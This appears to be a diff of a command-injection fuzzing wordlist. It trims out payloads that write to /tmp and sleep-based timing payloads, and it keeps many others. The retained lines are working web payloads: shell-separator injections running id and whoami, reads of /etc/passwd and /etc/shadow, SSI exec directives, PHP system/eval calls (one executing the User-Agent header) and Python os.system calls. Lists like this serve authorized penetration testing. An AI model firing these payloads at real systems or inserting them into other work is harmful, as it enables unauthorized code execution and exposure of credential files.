@@ -1,29 +1,18 @@
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd>/tmp/passwd1&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id>/tmp/id1;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 /index.html|id|
-/index.html|id>/tmp/id2|
-;id>/tmp/id3;
-;id>/tmp/id4
 ;id;
-|id>/tmp/id5
-|/usr/bin/id>/tmp/id6
 |id|
-|/usr/bin/id|>/tmp/id7
 ||/usr/bin/id|
-|id>/tmp/id8;
 ||/usr/bin/id;
 ;id|
 ;|/usr/bin/id|
-\n/usr/bin/id>/tmp/id9\n
 \nid\n
 \n/usr/bin/id;
 \nid;
 \n/usr/bin/id|
 \nid|
 a|id|
-a;id>/tmp/id12;
 a;id\n
 &&id
 ;id\n
@@ -34,45 +23,18 @@ a;id\n
 & id
 ;/usr/bin/id\n
 %0Acat%20/etc/passwd
-%0Aid>/tmp/id10
 %0a id %0a
-%0Aid>/tmp/id11%0A
 %0A/usr/bin/id
 %0A/usr/bin/id%0A
-%20{${sleep(10)}}
-() { :;}; /bin/bash -c "sleep 10"
-cat /etc/hosts>/tmp/hosts
-$(`cat /etc/passwd>/tmp/passwd`)
-cat /etc/passwd>/tmp/passwd2
-eval('ls >/tmp/ls2')
-eval('sleep 10')
-eval('sleep 10');
-eval('whoami >/tmp/whoami1')
-eval('whoami >/tmp/whoami2');
-<!--#exec cmd="/bin/cat /etc/passwd>/tmp/passwd3"-->
-<!--#exec cmd="/usr/bin/id>/tmp/id14;-->
-\necho INJECTX\nexit\n\033[2Asleep 10\n
 \n/usr/bin/id\n
 perl -e 'print "X"x1024'
-|| perl -e 'print "X"x16096'>/tmp/perl
 | perl -e 'print "X"x16096'
 ; perl -e 'print "X"x16096'
-& perl -e 'print "X"x16096'>/tmp/perl2
 && perl -e 'print "X"x16096'
-<?php system("sleep 10");?>
 :phpversion();
 ;${@print(md5(RCEVulnerable))};
 ${@print("RCEVulnerable")}
 ${@print(system($_SERVER['HTTP_USER_AGENT']))}
-| sleep 10
-; sleep 10
-& sleep 10
-&& sleep 10
-sleep 10
-|| sleep 10
-{${sleep(10)}}
-& sleep 10 
-{${sleep(hexdec(dechex(20)))}} 
 ;system('cat%20/etc/passwd')
 systeminfo
 | systeminfo
@@ -82,17 +44,8 @@ systeminfo
 system('ls')
 system('pwd')
 system('pwd');
-|| system('sleep 10');
-| system('sleep 10');
-; system('sleep 10');
-& system('sleep 10');
-&& system('sleep 10');
-system('sleep 10')
-system('sleep 10');
 system('whoami');
 uname
-;uname>/tmp/uname1;
-| uname>/tmp/uname2
 ; uname
 & uname
 && uname
@@ -102,7 +55,6 @@ $;/usr/bin/id
 | whoami
 ; whoami
 ' whoami
-' || whoami>/tmp/whoami3
 ' & whoami
 ' && whoami
 '; whoami
@@ -110,7 +62,6 @@ $;/usr/bin/id
 " || whoami
 " | whoami
 " & whoami
-" && whoami>/tmp/whoami4
 "; whoami
 $(`whoami`)
 & whoami
@@ -132,7 +83,6 @@ $(`whoami`)
 && 
 %0a
 %0a%0d
-%0Aid>/tmp/id13
 %0Aid%0A
 %20{${phpinfo()}}
 a;id|
@@ -142,8 +92,6 @@ $(`cat /etc/passwd`)
 cat /etc/passwd
 eval('whoami')
 eval('whoami');
-exec('sleep 10')
-exec('sleep 10');
 <!--#exec cmd="/bin/cat /etc/passwd"-->
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/usr/bin/id;-->
@@ -161,7 +109,6 @@ phpinfo()
 phpinfo();
 <?php system("cat /etc/passwd");?>
 \r\n
-system('cat /etc/passwd>/tmp/passwd4');
 |usr/bin/id\n
 |nid\n
 `/usr/bin/id`
@@ -187,17 +134,9 @@ a)|/usr/bin/id;
 ; id
 'id
 'id'
-'id>/tmp/id111
-'id>/tmp/id222'
 'id;'
-'id>/tmp/id666;'
 ';id
-';id>/tmp/id888
 ';id;
-';id>/tmp/id123;
-';id>/tmp/id999;'
-'`id>/tmp/id2023`'
-';`id>/tmp/id2022;`'
 __import__('os').system('id')
 __import__("os").system("id")
 ';__import__('os').system('id');'
